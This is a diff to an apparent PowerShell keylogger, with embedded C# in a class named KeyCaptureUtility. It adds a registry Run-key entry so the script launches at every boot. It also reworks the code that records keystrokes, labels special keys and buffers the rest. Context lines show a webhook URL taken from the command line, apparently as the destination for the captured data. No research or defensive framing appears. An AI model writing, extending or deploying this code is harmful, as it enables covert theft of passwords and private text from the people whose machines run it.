@@ -1,3 +1,32 @@
+# Add this script to startup to ensure it runs every time the system boots
+$scriptPath = $MyInvocation.MyCommand.Path  # Path of this script
+$regKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$scriptName = "MyStartupScript2"  # You can change this name if you like
+
+# Check if the script is already added to startup to avoid duplicates
+$existingEntry = Get-ItemProperty -Path $regKey -Name $scriptName -ErrorAction SilentlyContinue
+if ($existingEntry) {
+    Write-Host "Script is already added to startup." -ForegroundColor Yellow
+} else {
+    # Add the script to startup
+    try {
+        Set-ItemProperty -Path $regKey -Name $scriptName -Value "$scriptPath"
+        Write-Host "Script added to startup." -ForegroundColor Green
+    }
+    catch {
+        Write-Host "Error adding script to startup:" -ForegroundColor Red
+        Write-Host $_.Exception.Message
+    }
+
+    # Confirm that the entry has been added to the registry
+    $confirmation = Get-ItemProperty -Path $regKey -Name $scriptName -ErrorAction SilentlyContinue
+    if ($confirmation) {
+        Write-Host "Script successfully added to startup." -ForegroundColor Green
+    } else {
+        Write-Host "Failed to add script to startup." -ForegroundColor Red
+    }
+}
+
 # Ensure that the webhook URL is set directly from the command line
 $webhookURL = $args[0]  # The first argument is the webhook URL
 
@@ -97,34 +126,82 @@ public class KeyCaptureUtility
                             string charPressed = logChar.ToString();
 
                             // Handle special keys like Backspace, Enter, Escape, Shift, Alt, and other common keys
-                            if (asc == 8) charPressed = "[BKSP]";        // Backspace
-                            else if (asc == 13) charPressed = "[ENTER]";  // Enter
-                            else if (asc == 27) charPressed = "[ESC]";    // Escape
-                            else if (asc == 16) charPressed = "[SHIFT]";  // Shift
-                            else if (asc == 17) charPressed = "[CTRL]";   // Control (Ctrl)
-                            else if (asc == 18) charPressed = "[ALT]";    // Alt
-                            else if (asc == 91 || asc == 92)             // Windows key or Command key (Windows 91, Mac Command key 91 or 92)
-                                charPressed = "[CMD]";                   // Command (or Windows) key
-                            else if (asc == 32) charPressed = "[SPACE]";  // Spacebar
-                            else if (asc == 9) charPressed = "[TAB]";     // Tab
-                            else if (asc == 20) charPressed = "[CAPSLOCK]"; // CapsLock
-                            else if (asc == 27) charPressed = "[ESC]";    // Escape
-                            else if (asc == 33) charPressed = "[PAGEUP]";  // Page Up
-                            else if (asc == 34) charPressed = "[PAGEDOWN]";// Page Down
-                            else if (asc == 35) charPressed = "[END]";    // End
-                            else if (asc == 36) charPressed = "[HOME]";   // Home
-                            else if (asc == 37) charPressed = "[LEFTARROW]"; // Left Arrow
-                            else if (asc == 38) charPressed = "[UPARROW]";   // Up Arrow
-                            else if (asc == 39) charPressed = "[RIGHTARROW]"; // Right Arrow
-                            else if (asc == 40) charPressed = "[DOWNARROW]";  // Down Arrow
-                            else if (asc == 44) charPressed = "[PRINTSCREEN]"; // Print Screen
-                            else if (asc == 45) charPressed = "[INSERT]";     // Insert
-                            else if (asc == 46) charPressed = "[DELETE]";     // Delete
-                            else if (asc == 144) charPressed = "[NUMLOCK]";   // Num Lock
-                            else if (asc == 145) charPressed = "[SCROLLLOCK]"; // Scroll Lock
-                            else {
-                                // For all other keys, we translate normally
-                                captureBuffer.Append(charPressed);
+                            switch (asc)
+                            {
+                                case 8:
+                                    charPressed = "[BKSP]";        // Backspace
+                                    break;
+                                case 13:
+                                    charPressed = "[ENTER]";       // Enter
+                                    break;
+                                case 27:
+                                    charPressed = "[ESC]";         // Escape
+                                    break;
+                                case 16:
+                                    charPressed = "[SHIFT]";       // Shift
+                                    break;
+                                case 17:
+                                    charPressed = "[CTRL]";        // Control (Ctrl)
+                                    break;
+                                case 18:
+                                    charPressed = "[ALT]";         // Alt
+                                    break;
+                                case 91:
+                                case 92:
+                                    charPressed = "[CMD]";         // Command (or Windows) key
+                                    break;
+                                case 32:
+                                    charPressed = "[SPACE]";       // Spacebar
+                                    break;
+                                case 9:
+                                    charPressed = "[TAB]";         // Tab
+                                    break;
+                                case 20:
+                                    charPressed = "[CAPSLOCK]";    // CapsLock
+                                    break;
+                                case 33:
+                                    charPressed = "[PAGEUP]";      // Page Up
+                                    break;
+                                case 34:
+                                    charPressed = "[PAGEDOWN]";    // Page Down
+                                    break;
+                                case 35:
+                                    charPressed = "[END]";         // End
+                                    break;
+                                case 36:
+                                    charPressed = "[HOME]";        // Home
+                                    break;
+                                case 37:
+                                    charPressed = "[LEFTARROW]";   // Left Arrow
+                                    break;
+                                case 38:
+                                    charPressed = "[UPARROW]";     // Up Arrow
+                                    break;
+                                case 39:
+                                    charPressed = "[RIGHTARROW]";  // Right Arrow
+                                    break;
+                                case 40:
+                                    charPressed = "[DOWNARROW]";   // Down Arrow
+                                    break;
+                                case 44:
+                                    charPressed = "[PRINTSCREEN]"; // Print Screen
+                                    break;
+                                case 45:
+                                    charPressed = "[INSERT]";      // Insert
+                                    break;
+                                case 46:
+                                    charPressed = "[DELETE]";      // Delete
+                                    break;
+                                case 144:
+                                    charPressed = "[NUMLOCK]";     // Num Lock
+                                    break;
+                                case 145:
+                                    charPressed = "[SCROLLLOCK]";  // Scroll Lock
+                                    break;
+                                default:
+                                    // For all other keys, we translate normally
+                                    captureBuffer.Append(charPressed);
+                                    break;
                             }
                         }
                     }
